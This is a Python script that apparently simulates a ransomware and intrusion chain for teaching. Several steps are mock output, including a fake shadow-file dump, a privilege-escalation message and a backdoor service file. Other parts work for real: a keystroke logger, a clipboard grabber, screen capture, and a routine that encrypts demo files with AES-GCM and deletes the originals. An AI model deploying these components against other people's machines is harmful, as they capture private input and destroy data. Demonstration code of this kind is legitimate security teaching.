import os
import time
import random
import json
import glob
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from pynput import keyboard
import threading
import pyautogui
import mss

LOG_DIR = "logs"
EXFIL_DIR = os.path.join(LOG_DIR, "fake_exfil")
SHADOW_DUMP = os.path.join(LOG_DIR, "fake_shadow.txt")

def log_action(message):
    ts = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    print(f"{ts} {message}")

def simulate_progress(task="Processing", steps=10, delay=0.2):
    for i in range(steps):
        bar = "█" * (i+1) + "-" * (steps - i - 1)
        percent = (i+1) * (100 // steps)
        print(f"{task}: [{bar}] {percent}%", end="\r")
        time.sleep(delay)
    print()

def simulate_credential_dump():
    log_action("🟠 Simulating credential dump from /etc/shadow")
    simulate_progress("Extracting credentials", 12, 0.1)
    shadow_data = """root:$6$abc$Kp71jS...:19000:0:99999:7:::
admin:$6$xyz$Tq89gF...:19001:0:99999:7:::
user:$6$ghi$Lo82kH...:19002:0:99999:7:::"""
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(SHADOW_DUMP, "w") as f:
        f.write(shadow_data)
    log_action(f"✅ Dumped credentials to {SHADOW_DUMP}")

def simulate_privilege_escalation():
    log_action("🔺 Attempting local privilege escalation (simulated)")
    simulate_progress("Running exploit CVE-2023-XXXX", 10, 0.15)
    log_action("✅ Root shell access granted (simulated)")
    print("root@victim:~# whoami\nroot")

def simulate_persistence():
    log_action("📌 Establishing persistence (simulated)")
    fake_service = """[Unit]
Description=Fake Backdoor Service
[Service]
ExecStart=/usr/bin/fake_backdoor
[Install]
WantedBy=multi-user.target"""
    os.makedirs(os.path.join(LOG_DIR, "persistence"), exist_ok=True)
    with open(os.path.join(LOG_DIR, "persistence", "backdoor.service"), "w") as f:
        f.write(fake_service)
    log_action("✅ Fake systemd service created (simulated)")

def simulate_data_exfiltration():
    log_action("📤 Exfiltrating files to attacker server (simulated)")
    os.makedirs(EXFIL_DIR, exist_ok=True)
    for i in range(3):
        filename = f"report_{i+1}.txt"
        with open(os.path.join(EXFIL_DIR, filename), "w") as f:
            f.write(f"Sensitive data {random.randint(1000,9999)}\n" * 5)
    simulate_progress("Uploading to C2", 8, 0.1)
    log_action(f"✅ Data copied to {EXFIL_DIR} (simulated exfiltration)")

def simulate_ransomware():
    demo_dir = os.path.expanduser("~/Documents/WTB/demo_files")
    os.makedirs(demo_dir, exist_ok=True)
    print("💀 [SIMULATION] Encrypting demo files in", demo_dir)

    key = AESGCM.generate_key(bit_length=128)
    aesgcm = AESGCM(key)
    secrets = {}

    for path in glob.glob(os.path.join(demo_dir, "*.txt")):
        nonce = os.urandom(12)
        with open(path, "rb") as f:
            data = f.read()
        ct = aesgcm.encrypt(nonce, data, None)
        locked_path = path + ".locked"
        with open(locked_path, "wb") as f:
            f.write(nonce + ct)
        os.remove(path)
        print(f"🔒 Encrypted: {os.path.basename(path)} → {os.path.basename(locked_path)}")
        secrets[os.path.basename(locked_path)] = {
            "key": key.hex(),
            "nonce": nonce.hex()
        }
        time.sleep(0.2)

    with open(os.path.join(demo_dir, "demo_key.json"), "w") as f:
        json.dump(secrets, f)

    ransom_note = os.path.join(demo_dir, "README_RESTORE.txt")
    with open(ransom_note, "w") as f:
        f.write("Your demo files have been encrypted!\nThis is a harmless educational simulation.\nOriginal files were removed safely.\n")
    print(f"📜 Ransom note created at {ransom_note}")
    print("✅ Ransomware simulation complete.")

def simulated_decrypt_ransomware():
    demo_dir = os.path.expanduser("~/Documents/WTB/demo_files")
    key_path = os.path.join(demo_dir, "demo_key.json")

    if not os.path.exists(key_path):
        print("❌ No encryption key file found. Cannot decrypt.")
        return

    with open(key_path, "r") as f:
        secrets = json.load(f)

    print("🛡️ [SIMULATION] Decrypting demo files in", demo_dir)
    for locked_file in glob.glob(os.path.join(demo_dir, "*.locked")):
        filename = os.path.basename(locked_file)
        if filename not in secrets:
            print(f"⚠️ Missing key for {filename}, skipping.")
            continue

        key = bytes.fromhex(secrets[filename]["key"])
        nonce = bytes.fromhex(secrets[filename]["nonce"])
        aesgcm = AESGCM(key)

        with open(locked_file, "rb") as f:
            data = f.read()
        try:
            ct = data[12:]  # skip nonce
            decrypted = aesgcm.decrypt(nonce, ct, None)
            restored_path = locked_file.replace(".locked", ".restored.txt")
            with open(restored_path, "wb") as f:
                f.write(decrypted)
            os.remove(locked_file)
            print(f"🔓 Restored: {restored_path}")
        except Exception as e:
            print(f"❌ Decryption failed for {filename}: {e}")

    print("✅ Decryption simulation complete.")

# keylogger
_keylogger_thread = None
_keylogger_running = False

def _log_keypress(key):
    try:
        with open("logs/usb_keylog.txt", "a") as f:
            f.write(f"{time.strftime('%H:%M:%S')} - {key.char}\n")
    except AttributeError:
        with open("logs/usb_keylog.txt", "a") as f:
            f.write(f"{time.strftime('%H:%M:%S')} - {str(key)}\n")

def _start_keylogger():
    with keyboard.Listener(on_press=_log_keypress) as listener:
        listener.join()

def simulate_usb_keylogger():
    global _keylogger_thread, _keylogger_running
    log_action("⌨️ Starting real USB keylogger (your own system)")
    os.makedirs(LOG_DIR, exist_ok=True)

    if _keylogger_running:
        log_action("⚠️ Keylogger is already running.")
        return

    _keylogger_running = True
    _keylogger_thread = threading.Thread(target=_start_keylogger, daemon=True)
    _keylogger_thread.start()
    log_action("✅ Keylogger started. Keystrokes will be saved to logs/usb_keylog.txt")

# screen_capture
def simulate_screen_capture():
    os.makedirs(LOG_DIR, exist_ok=True)
    screenshot_path = os.path.join(LOG_DIR, "screenshot.png")

    try:
        with mss.mss() as sct:
            sct.shot(output=screenshot_path)
        log_action(f"✅ Screenshot saved to {screenshot_path}")
    except Exception as e:
        log_action(f"❌ Screen capture failed: {e}")

# 📋 Simulate Clipboard Hijack
def simulate_clipboard_hijack():
    import pyperclip
    import os
    from datetime import datetime

    print("📋 Simulating clipboard hijack...")
    try:
        clipboard_data = pyperclip.paste()
        if clipboard_data:
            log_path = os.path.join("logs", "clipboard_hijack_log.txt")
            with open(log_path, "a") as f:
                f.write(f"[{datetime.now()}] {clipboard_data}\n")
            print(f"✅ Clipboard content captured and saved to {log_path}")
        else:
            print("⚠️ No clipboard data found.")
    except Exception as e:
        print(f"❌ Clipboard hijack failed: {e}")
